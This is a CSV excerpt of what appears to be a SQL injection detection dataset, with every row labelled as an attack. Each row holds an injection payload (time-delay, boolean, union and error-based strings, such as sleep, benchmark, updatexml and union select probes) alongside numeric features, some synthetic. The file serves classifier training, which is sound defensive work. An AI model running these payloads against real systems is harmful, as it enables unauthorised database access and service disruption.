id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001570,attack,time,1   )    )    as beld where 1679  =  1679 or sleep  (  5  )  #,nearest_attack_euclidean,R007770,0.33099417726895014,55.2405512909359,19.648110258187177,3.2410064569409087,15.296220516374355,10.0,24.39496068849914,5.5493700860623925,0.2745489872266177,0.18448678349026806,0.4398600296982642,0.10110419958485004,0.0,0.0,0.0,0.0,0.0,1.0,0.0,3.549370086062393,0.0,0.0,0.0,0.9999999999999996,0.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001571,attack,boolean,"-6747"" or 9323  =  9323#",nearest_attack_euclidean,R001094,0.06560778685536547,24.0,13.388807294260097,3.375786099061062,2.0,12.0,6.0,4.0,0.08333333333333331,0.5,0.25,0.16666666666666666,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001572,attack,error,"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""ygzq"" like ""ygzq",nearest_attack_euclidean,R003839,0.28116686145575753,165.43715365040612,30.625138539837558,3.9346505329569585,49.0,39.0,55.749722920324885,21.687430730081225,0.2964247585102678,0.23592990983470288,0.33660945914517326,0.13103587250985607,0.0,4.0,0.0,0.0,0.0,1.0,0.0,10.687430730081221,0.0,0.0,6.0,0.9999999999999996,0.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001573,attack,boolean,"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001323,0.028982358954808485,135.49288971658368,33.0,4.232840280589946,71.0,9.0,37.410741430486404,18.082148286097283,0.52416250088801,0.06644313391538155,0.27594926548763254,0.1334450997089759,0.0,1.0,2.0,0.0,1.0,1.0,0.0,5.082148286097281,0.9999999999999999,0.0,3.0,4.0,0.0,1.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001574,attack,union,"-2667  )   union all select 5848,5848,5848,5848--",nearest_attack_euclidean,R004346,0.30675640375459073,46.80698499938195,20.0,3.933046102138052,14.0,18.24558799950557,8.0,6.561396999876392,0.2999546428611561,0.38863363264755735,0.17140265306351776,0.14000907142776878,0.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.5613969998763926,3.0,0.0,0.0,1.0,0.0,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001575,attack,time,"1%""   )    )     )   and sleep  (  5  )  #",nearest_attack_euclidean,R003059,0.02154732239966375,41.98878357575991,14.988783575759907,2.5330717821306736,7.9999999999999964,2.0,24.0,7.988783575759905,0.19052829929960552,0.047632074824901394,0.5715848978988166,0.19025472797667642,0.0,1.0,0.0,0.0,0.0,0.0,0.0,5.0,0.9887835757599063,0.0,0.0,0.0,0.0,1.0,0.0,1.0000000000000002,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001576,attack,union," select * from users where id  =  1 +1<@ union select null,version  (    )   -- 1",nearest_attack_euclidean,R000489,0.10415313397137738,78.74084021277817,26.62347336879636,3.9126908530319118,42.493893475185445,3.0,23.623473368796358,9.623473368796361,0.5394910950004579,0.03815267149986265,0.3002010169161859,0.12215521658349358,0.0,0.0,2.0,0.0,1.0,1.0,0.0,1.9999999999999991,0.0,0.0,1.0,6.0,0.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001577,attack,other,"-7416"" where 7656  =  7656 order by 1--",nearest_attack_euclidean,R001091,0.9801913955776334,39.0,17.613112939257068,3.719834356690052,12.0,13.0,9.0,5.0,0.3076923076923077,0.3333333333333333,0.23076923076923078,0.1282051282051282,0.3065564696285341,0.6934435303714659,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,4.0,0.3065564696285341,0.6934435303714659,1.0,0.0,2.168404344971009e-19,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,0.0,3.0
SMOTE_001578,attack,error,"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'eugs'  =  'eugs",nearest_attack_euclidean,R001102,0.06864085597543908,194.0,27.513966739635183,3.5214620230173073,44.0,39.0,83.0,28.0,0.2268041237113402,0.20103092783505155,0.42783505154639173,0.14432989690721648,4.0,0.0,0.0,0.0,0.0,2.0,0.0,16.0,0.0,0.0,6.0,2.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001579,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   4982  =  4982,nearest_attack_euclidean,R004092,0.21240613744317322,107.9856369654252,24.997948137917888,3.04218128652548,29.663246896529813,9.332649379305963,56.324441930977514,12.665298758611925,0.27498702333368,0.08673322955860051,0.5208176848585147,0.11746206224920483,0.0,0.0,0.0,0.0,1.0,1.0,0.0,10.665298758611923,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001580,attack,boolean,"1""  )   as lkzz where 3565  =  3565 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R002149,0.03758403438522795,212.4509362917376,36.78037451669504,3.8823446078078865,63.670561775042565,34.890187258347524,81.89018725834752,32.0,0.29965932920310046,0.16422274140977372,0.3854768405861731,0.15064108880095278,0.0,1.0,2.0,0.0,0.0,2.0,0.0,17.0,0.0,1.0,3.0,10.0,0.0,1.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001581,attack,time,"1%'   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R004812,1.093729827874332,106.43508900157298,27.0,3.3356964796905295,18.0,21.43508900157297,50.0,17.0,0.16912082507244636,0.20137388160233666,0.4697800696456843,0.15972522367953265,4.0,0.0,0.0,0.0,0.0,2.0,0.0,8.0,2.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.4350890015729676,0.5649109984270323,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001582,attack,other,1'+  (  select iutk where 6158  =  6158,nearest_attack_euclidean,R001350,0.0,39.0,20.0,3.7774884930372807,15.0,9.0,11.0,4.0,0.38461538461538464,0.23076923076923078,0.28205128205128205,0.10256410256410256,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001583,attack,union,"-4371'   )    )     )   union all select 7465,7465,7465,7465,7465,7465,7465#",nearest_attack_euclidean,R006001,0.13277337206519216,74.57663404732266,22.0,3.7203156190317466,14.0,32.0,16.861307237858124,11.715326809464532,0.18790346985498196,0.429493645382816,0.22555224930048362,0.15705063546171838,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.715326809464531,0.0,0.0,6.0,0.9999999999999996,1.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001584,attack,boolean,-2303'   )    )    as exyt where 2528  =  2528 or 8571  =  8571--,nearest_attack_euclidean,R005015,0.2550336764834843,62.59885938561261,21.656979912230373,3.627361830937237,13.0,20.0,21.941879473382244,7.656979912230373,0.20827979522202547,0.32043045418773153,0.3490317083594544,0.1222580422307887,1.0,0.0,3.0,0.0,0.0,2.0,0.0,1.6569799122303737,0.0,0.0,0.0,5.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001585,attack,other,1'+  (  select 'dpun' where 4760  =  4760,nearest_attack_euclidean,R002791,0.0,41.0,22.0,3.923195045906529,15.0,9.0,11.0,6.0,0.36585365853658536,0.21951219512195122,0.2682926829268293,0.14634146341463414,3.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001586,attack,error,"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'efwq' like 'efwq",nearest_attack_euclidean,R006573,0.04970575161074304,203.23119688676135,32.0,3.610829269846638,58.0,32.0,86.05531161722402,27.175885269537336,0.2854920833463476,0.15751287357039873,0.42327927235296425,0.13371577073028937,4.0,0.0,0.0,0.0,1.0,1.0,0.0,16.175885269537336,0.0,0.0,4.0,2.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001587,attack,boolean,"1' where 4149  =  4149 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R002335,0.032023863489840716,125.653295709249,34.20101406438431,3.8864573207981694,37.30152109657646,23.0,48.30152109657646,17.050253516096078,0.29678366352636776,0.18312893905433467,0.3843670691610496,0.13572032825824792,3.0,0.0,2.0,1.0,0.0,2.0,0.0,8.050253516096076,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001588,attack,time,"1   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  6556  =  6556",nearest_attack_euclidean,R004678,0.33967507480972353,118.86506895637751,25.0,3.131051166160092,18.0,29.86506895637752,58.0,13.0,0.1514334680804162,0.25124563004683087,0.4879522860368968,0.10936861583585616,0.0,0.0,0.0,0.0,0.0,2.0,0.0,10.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.8650689563775198,0.13493104362248012,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001589,attack,time,1'  )   as xrap where 5523  =  5523 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R005004,0.23500542446115022,112.79394201983683,29.70585893597824,3.4696056192623144,39.823435743912974,10.0,50.11757680793473,12.852929467989123,0.352621172846668,0.08887483302622884,0.4444374165131144,0.11406657761398872,1.0,0.0,0.0,0.0,1.0,1.0,0.0,8.85292946798912,0.0,0.0,0.0,2.0,1.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,1.0,1.0,0.14707053201087805,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.147070532010878
SMOTE_001590,attack,time,"1 where 7158  =  7158 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R006285,0.051549314034365905,71.49714696677054,20.298288180062325,3.2944000709093606,15.0,18.0,30.397717573416436,8.099429393354109,0.20988561814278017,0.2518627417713362,0.42500436225156607,0.11324727783431753,0.0,0.0,0.0,0.0,0.0,2.0,0.0,4.099429393354109,0.0,0.0,1.0,2.0,0.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001591,attack,boolean,1'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  'gzpx'  =  'gzpx,nearest_attack_euclidean,R005819,0.02668139651228653,123.0,28.836719175352705,3.5498926753689495,42.0,13.0,54.0,14.0,0.34146341463414637,0.10569105691056911,0.43902439024390244,0.11382113821138211,4.0,0.0,0.0,0.0,0.0,2.0,0.0,8.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_001592,attack,other,//*,nearest_attack_euclidean,R000618,2.0092859650687696,3.7291615700066245,2.87499388400796,1.2218755696405257,0.7291615700066316,0.0,7.105427357601002e-15,3.0,0.09114519625082931,0.0,0.0,0.9088548037491707,0.1458323140013269,0.0,0.0,1.8541676859986729,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8541676859986733,0.1458323140013269,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.440892098500626e-16
SMOTE_001593,attack,time,1  )   as gfhf where 5804  =  5804 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R005949,0.08490446511037014,94.78203666435019,28.65877487143849,3.751608653576596,28.976324614315466,18.0,37.976324614315466,9.829387435719244,0.30525802499485705,0.19046678203751802,0.40049141601361604,0.10378377695400895,0.0,0.0,2.0,0.0,0.0,2.0,0.0,4.829387435719244,0.0,1.0,0.0,4.0,0.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001594,attack,union,"-6554'   )    )     )   union all select 4384,4384,4384,4384,4384#",nearest_attack_euclidean,R002948,0.16785146023540792,64.64596426210363,21.0,3.6236930566407834,14.0,22.916771409682912,18.0,9.729192852420727,0.21682973182576976,0.3539502659584165,0.2787810837759897,0.15043891843982404,1.0,0.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,3.7291928524207276,0.9999999999999996,1.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001595,attack,boolean," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",nearest_attack_euclidean,R000041,0.11736659915041417,59.0,22.0,3.6255647807017093,26.0,4.0,20.0,9.0,0.4406779661016949,0.06779661016949153,0.3389830508474576,0.15254237288135594,0.0,2.0000000000000004,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.12028704206304769,0.0,5.0,0.0,1.0,1.0,0.0,2.168404344971009e-19,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001596,attack,error,"-5294%""  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  ""%""  =  """,nearest_attack_euclidean,R005270,0.019889931644710958,423.42976979997496,35.0,3.449319603391862,103.0,54.0,190.54381583998,75.88595395999499,0.24325912468440988,0.12753391002871975,0.44999026914340245,0.17921669614346789,0.0,4.0,1.0,0.0,0.0,3.0,0.0,39.885953959995,2.0,0.0,0.0,30.0,0.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,2.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,8.0
SMOTE_001597,attack,time,1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  'zqiw'  =  'zqiw,nearest_attack_euclidean,R002717,0.2634524632376294,107.39709775556692,27.53970977555669,3.3826331256065347,41.0,2.0,49.31767820445353,15.079419551113382,0.38259094818117617,0.018662973082008594,0.45846759259924275,0.1402784861375725,4.0,0.0,0.0,0.0,1.0,1.0,0.0,9.079419551113382,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001598,attack,boolean,"1' where 6953  =  6953 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R006298,0.011997460496638572,149.0,35.912541739892006,4.383940097491652,76.0,17.0,39.0,17.0,0.5100671140939598,0.11409395973154363,0.26174496644295303,0.11409395973154363,1.0,0.0,2.0,0.0,1.0,2.0,0.0,4.0,0.0,0.0,3.0,5.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001599,attack,boolean,-2504'   )    )     )   or 8723  =  9715,nearest_attack_euclidean,R005070,0.041412528302309855,40.0,15.78738146217879,2.8774483560752966,2.0,12.0,20.0,6.0,0.04999999999999999,0.3,0.5,0.15,1.0,0.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001600,attack,union," select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",nearest_attack_euclidean,R000049,0.05944774051981903,79.7246303563243,34.181157589081074,4.261634880955043,40.0,2.1811575890810744,23.36231517816215,14.181157589081074,0.5019086145717597,0.027278052283781634,0.29296269648914913,0.17785063665530954,3.0,0.0,2.0,0.0,1.0,1.0,0.0,1.9999999999999991,0.0,0.0,1.0,4.181157589081074,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
